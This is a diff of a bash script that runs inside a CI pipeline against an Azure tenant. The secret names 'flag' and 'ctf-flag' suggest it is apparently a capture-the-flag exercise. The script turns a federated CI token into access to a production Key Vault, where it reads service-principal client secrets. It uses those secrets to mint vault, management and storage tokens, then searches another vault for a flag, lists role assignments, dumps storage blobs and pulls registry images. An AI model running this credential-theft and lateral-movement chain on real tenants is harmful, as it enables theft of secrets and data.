@@ -10,221 +10,164 @@ JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
 az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
   --federated-token "$JWT" --allow-no-subscriptions -o none
 
-ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)
-GRAPH=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv 2>/dev/null || echo "")
+echo "=== READ sync-service-principal ==="
+SYNCRAW=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name sync-service-principal 2>/dev/null)
+SYNC_CID=$(echo "$SYNCRAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d.get("value","{}"));print(v.get("appId",""))' 2>/dev/null)
+SYNC_SEC=$(echo "$SYNCRAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d.get("value","{}"));print(v.get("clientSecret",""))' 2>/dev/null)
+echo "sync-service appId: $SYNC_CID"
+echo "sync-service clientSecret: ${SYNC_SEC:0:20}..."
 
-echo "=== LOOK UP UNKNOWN OID 1fe7a412 VIA GRAPH ==="
-if [ -n "$GRAPH" ]; then
-  curl -sS "https://graph.microsoft.com/v1.0/directoryObjects/1fe7a412-82e9-4135-ab4b-72a0be429adb" \
-    -H "Authorization: Bearer $GRAPH"
-  echo ""
-else
-  echo "No graph token"
+echo ""
+echo "=== GET sync-service TOKENS ==="
+# ARM token
+SYNC_AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
+  --data-urlencode "client_id=$SYNC_CID" --data-urlencode "client_secret=$SYNC_SEC" \
+  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
+  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+echo "sync-service ARM token len=${#SYNC_AT}"
+
+# Vault token
+SYNC_VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
+  --data-urlencode "client_id=$SYNC_CID" --data-urlencode "client_secret=$SYNC_SEC" \
+  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://vault.azure.net/.default" \
+  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+echo "sync-service vault token len=${#SYNC_VT}"
+
+# Storage token
+SYNC_ST=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
+  --data-urlencode "client_id=$SYNC_CID" --data-urlencode "client_secret=$SYNC_SEC" \
+  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://storage.azure.com/.default" \
+  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+echo "sync-service storage token len=${#SYNC_ST}"
+
+# Get OID from ARM token
+if [ "${#SYNC_AT}" -gt 100 ]; then
+  SYNC_OID=$(python3 -c "
+import sys,json,base64
+t='$SYNC_AT'.split('.')[1]; t+='='*((-len(t))%4)
+print(json.loads(base64.urlsafe_b64decode(t)).get('oid',''))
+" 2>/dev/null)
+  echo "sync-service OID: $SYNC_OID"
 fi
 
 echo ""
-echo "=== ALL SECRETS IN KV PROD (list) ==="
-az keyvault secret list --vault-name kv-tbl-prod-x3euoz --output json 2>/dev/null | python3 -c '
+echo "=== sync-service ON KV SEC ==="
+if [ "${#SYNC_VT}" -gt 100 ]; then
+  echo "--- secrets list ---"
+  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
+    -H "Authorization: Bearer $SYNC_VT"
+  echo ""
+  echo "--- flag secret ---"
+  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4" \
+    -H "Authorization: Bearer $SYNC_VT"
+  echo ""
+  echo "--- kv-tbl-prod-x3euoz list (access policy) ---"
+  curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
+    -H "Authorization: Bearer $SYNC_VT"
+fi
+
+echo ""
+echo "=== sync-service ARM - ROLE ASSIGNMENTS ==="
+if [ "${#SYNC_AT}" -gt 100 ]; then
+  echo "--- sub-level role assignments for sync-service ---"
+  curl -sS "$ARM_BASE/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'$SYNC_OID'" \
+    -H "Authorization: Bearer $SYNC_AT" | python3 -c '
 import sys,json
-secrets=json.load(sys.stdin)
-for s in secrets:
-    name=s["id"].rsplit("/",1)[-1]
-    enabled=s.get("attributes",{}).get("enabled","")
-    print(f"  {name} enabled={enabled}")
-' 2>/dev/null || echo "list failed"
+d=json.load(sys.stdin)
+vals=d.get("value",[])
+err=d.get("error",{})
+if err: print("ERR:", err.get("code",""), err.get("message","")[:200])
+else:
+    print("Total assignments:", len(vals))
+    for r in vals:
+        role=r["properties"]["roleDefinitionId"].split("/")[-1]
+        scope=r["properties"]["scope"]
+        print(f"  role={role[:8]} scope={scope[:100]}")
+' 2>/dev/null
+fi
 
 echo ""
-echo "=== READ ALL SECRETS IN KV PROD ==="
-for secret in cost-reader-principal directory-audit-principal legacy-admin-principal reporting-viewer-principal secrets-sync-principal reporting-service-principal; do
-  VAL=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name "$secret" 2>/dev/null \
-    | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("value","")[:80])' 2>/dev/null)
-  echo "  $secret: ${VAL:0:60}"
-done
-
-echo ""
-echo "=== READ SECRETS-SYNC CREDENTIALS ==="
+echo "=== secrets-sync CI LOGS DIRECT CONTAINER ACCESS ==="
 SS_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name secrets-sync-principal 2>/dev/null \
   | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
 SS_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name secrets-sync-principal 2>/dev/null \
   | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
-echo "SS_CID: $SS_CID"
 
 SS_ST=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
   --data-urlencode "client_id=$SS_CID" --data-urlencode "client_secret=$SS_SEC" \
   --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://storage.azure.com/.default" \
   | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
-echo "secrets-sync storage token len=${#SS_ST}"
+echo "SS storage token len=${#SS_ST}"
 
 if [ "${#SS_ST}" -gt 100 ]; then
-  echo "--- List containers in sttblcilogsprodx3euoz ---"
-  CONTAINERS=$(curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list" \
+  echo "--- Direct list blobs in 'logs' container ---"
+  BLIST=$(curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/logs?restype=container&comp=list" \
     -H "Authorization: Bearer $SS_ST" -H "x-ms-version: 2021-08-06")
-  echo "$CONTAINERS" | head -c 3000
+  echo "$BLIST" | head -c 3000
 
   echo ""
-  echo "--- List blobs in each container ---"
-  python3 << PYEOF
-import xml.etree.ElementTree as ET,re,urllib.request,sys
-
-CONTAINERS="""$CONTAINERS"""
-tok="$SS_ST"
-base="https://sttblcilogsprodx3euoz.blob.core.windows.net"
-
-try:
-    root=ET.fromstring(CONTAINERS)
-    for c in root.iter("Name"):
-        cn=c.text
-        if cn:
-            print(f"=== Container: {cn} ===")
-            req=urllib.request.Request(f"{base}/{cn}?restype=container&comp=list",
-                headers={"Authorization":"Bearer "+tok,"x-ms-version":"2021-08-06"})
-            with urllib.request.urlopen(req,timeout=20) as r:
-                body=r.read().decode("utf-8","replace")
-            print(body[:2000])
-            # Read each blob
-            for bn in re.findall(r"<Name>(.*?)</Name>",body):
-                req2=urllib.request.Request(f"{base}/{cn}/{bn}",
-                    headers={"Authorization":"Bearer "+tok,"x-ms-version":"2021-08-06"})
-                try:
-                    with urllib.request.urlopen(req2,timeout=20) as r2:
-                        blob=r2.read().decode("utf-8","replace")
-                    print(f"BLOB {cn}/{bn}:")
-                    print(blob[:5000])
-                except Exception as e:
-                    print(f"BLOB {cn}/{bn} ERR: {e}")
-except Exception as e:
-    print(f"XML parse error: {e}")
-PYEOF
-fi
-
-echo ""
-echo "=== READ COST-READER CREDENTIALS ==="
-CR_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name cost-reader-principal 2>/dev/null \
-  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
-CR_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name cost-reader-principal 2>/dev/null \
-  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
-echo "CR_CID: $CR_CID"
-
-CR_OID=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
-  --data-urlencode "client_id=$CR_CID" --data-urlencode "client_secret=$CR_SEC" \
-  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
-  | python3 -c '
-import sys,json,base64
-d=json.load(sys.stdin)
-t=d.get("access_token","")
-if t:
-    p=t.split(".")[1]; p+="="*((-len(p))%4)
-    c=json.loads(base64.urlsafe_b64decode(p))
-    print(c.get("oid",""))
-' 2>/dev/null)
-echo "cost-reader OID: $CR_OID"
-
-# Check if cost-reader is 1fe7a412
-echo "Is 1fe7a412? $([ "$CR_OID" = "1fe7a412-82e9-4135-ab4b-72a0be429adb" ] && echo YES || echo NO)"
-
-echo ""
-echo "=== CHECK cost-reader ON KV SEC ==="
-CR_VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
-  --data-urlencode "client_id=$CR_CID" --data-urlencode "client_secret=$CR_SEC" \
-  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://vault.azure.net/.default" \
-  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
-echo "cost-reader vault token len=${#CR_VT}"
-
-if [ "${#CR_VT}" -gt 100 ]; then
-  echo "--- KV sec secrets list ---"
-  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
-    -H "Authorization: Bearer $CR_VT"
-  echo ""
-  echo "--- KV sec flag ---"
-  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4" \
-    -H "Authorization: Bearer $CR_VT"
-  echo ""
-  echo "--- All KV sec secrets (wildcard) ---"
-  for name in flag ctf-flag df26 secret main-secret tbl-secret tebamoto; do
+  echo "--- Try other common container names ---"
+  for cn in builds ci-logs github-actions actions artifacts; do
     S=$(curl -sS -o /dev/null -w '%{http_code}' \
-      "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$name?api-version=7.4" \
-      -H "Authorization: Bearer $CR_VT")
-    echo "  /secrets/$name: $S"
+      "https://sttblcilogsprodx3euoz.blob.core.windows.net/$cn?restype=container&comp=list" \
+      -H "Authorization: Bearer $SS_ST" -H "x-ms-version: 2021-08-06")
+    echo "  container '$cn': $S"
   done
+
+  echo ""
+  echo "--- Try with sync-service token (if different) ---"
+  if [ "${#SYNC_ST}" -gt 100 ]; then
+    echo "sync-service on CI logs:"
+    curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list" \
+      -H "Authorization: Bearer $SYNC_ST" -H "x-ms-version: 2021-08-06" | head -c 1000
+    echo ""
+    echo "sync-service on appcfg:"
+    curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/?comp=list" \
+      -H "Authorization: Bearer $SYNC_ST" -H "x-ms-version: 2021-08-06" | head -c 1000
+    echo ""
+    echo "sync-service on backup:"
+    curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/?comp=list" \
+      -H "Authorization: Bearer $SYNC_ST" -H "x-ms-version: 2021-08-06" | head -c 1000
+  fi
 fi
 
 echo ""
-echo "=== CHECK DIRECTORY-AUDIT ON KV SEC ==="
-DA_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name directory-audit-principal 2>/dev/null \
-  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
-DA_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name directory-audit-principal 2>/dev/null \
-  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
-echo "DA_CID: $DA_CID"
+echo "=== ACR LOGIN AND CATALOG-API ==="
+# Try ACR with cicd-deployer OIDC token
+ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)
+ACR_TOKEN=$(curl -sS "https://crtblplatprodx3euoz.azurecr.io/oauth2/exchange" \
+  -X POST --data-urlencode "grant_type=access_token" \
+  --data-urlencode "service=crtblplatprodx3euoz.azurecr.io" \
+  --data-urlencode "access_token=$ARM" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("refresh_token",""))' 2>/dev/null)
+echo "ACR refresh token len=${#ACR_TOKEN}"
 
-DA_OID=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
-  --data-urlencode "client_id=$DA_CID" --data-urlencode "client_secret=$DA_SEC" \
-  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
-  | python3 -c '
-import sys,json,base64
-d=json.load(sys.stdin)
-t=d.get("access_token","")
-if t:
-    p=t.split(".")[1]; p+="="*((-len(p))%4)
-    c=json.loads(base64.urlsafe_b64decode(p))
-    print(c.get("oid",""))
-' 2>/dev/null)
-echo "directory-audit OID: $DA_OID"
-echo "Is 1fe7a412? $([ "$DA_OID" = "1fe7a412-82e9-4135-ab4b-72a0be429adb" ] && echo YES || echo NO)"
+if [ "${#ACR_TOKEN}" -gt 100 ]; then
+  # Get catalog-api repo tags
+  ACR_SCOPE="repository:catalog-api:pull"
+  ACR_ACCESS=$(curl -sS "https://crtblplatprodx3euoz.azurecr.io/oauth2/token?service=crtblplatprodx3euoz.azurecr.io&scope=repository:catalog-api:pull" \
+    -X POST --data-urlencode "grant_type=refresh_token" \
+    --data-urlencode "refresh_token=$ACR_TOKEN" \
+    | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+  echo "catalog-api access token len=${#ACR_ACCESS}"
 
-DA_VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
-  --data-urlencode "client_id=$DA_CID" --data-urlencode "client_secret=$DA_SEC" \
-  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://vault.azure.net/.default" \
-  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
-echo "directory-audit vault token len=${#DA_VT}"
-
-if [ "${#DA_VT}" -gt 100 ]; then
-  echo "--- KV sec secrets list ---"
-  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
-    -H "Authorization: Bearer $DA_VT"
+  if [ "${#ACR_ACCESS}" -gt 100 ]; then
+    echo "--- catalog-api tags ---"
+    curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/catalog-api/tags/list" \
+      -H "Authorization: Bearer $ACR_ACCESS"
+    echo ""
+    echo "--- catalog-api manifest ---"
+    curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/catalog-api/manifests/latest" \
+      -H "Authorization: Bearer $ACR_ACCESS" | head -c 3000
+  fi
 fi
 
 echo ""
-echo "=== CHECK REPORTING-VIEWER ON KV SEC ==="
-RV_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-viewer-principal 2>/dev/null \
-  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
-RV_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-viewer-principal 2>/dev/null \
-  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
-echo "RV_CID: $RV_CID"
-
-RV_OID=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
-  --data-urlencode "client_id=$RV_CID" --data-urlencode "client_secret=$RV_SEC" \
-  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
-  | python3 -c '
-import sys,json,base64
-d=json.load(sys.stdin)
-t=d.get("access_token","")
-if t:
-    p=t.split(".")[1]; p+="="*((-len(p))%4)
-    c=json.loads(base64.urlsafe_b64decode(p))
-    print(c.get("oid",""))
-' 2>/dev/null)
-echo "reporting-viewer OID: $RV_OID"
-echo "Is 1fe7a412? $([ "$RV_OID" = "1fe7a412-82e9-4135-ab4b-72a0be429adb" ] && echo YES || echo NO)"
-
-RV_VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
-  --data-urlencode "client_id=$RV_CID" --data-urlencode "client_secret=$RV_SEC" \
-  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://vault.azure.net/.default" \
-  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
-echo "reporting-viewer vault token len=${#RV_VT}"
-
-if [ "${#RV_VT}" -gt 100 ]; then
-  echo "--- KV sec secrets list ---"
-  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
-    -H "Authorization: Bearer $RV_VT"
-fi
+echo "=== APPCFG STORAGE - internal-config.json ANONYMOUS ==="
+curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" | head -c 2000
 
 echo ""
-echo "=== ACR ADMIN CREDENTIALS ==="
-ACR_CREDS=$(curl -sS -X POST \
-  "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-01-01-preview" \
-  -H "Authorization: Bearer $ARM" -H "Content-Length: 0")
-echo "ACR creds:"
-echo "$ACR_CREDS" | head -c 500
+echo "=== BACKUP STORAGE - PUBLIC EXPORTS ==="
+curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" | head -c 3000
 
 echo ""
 echo "DONE"
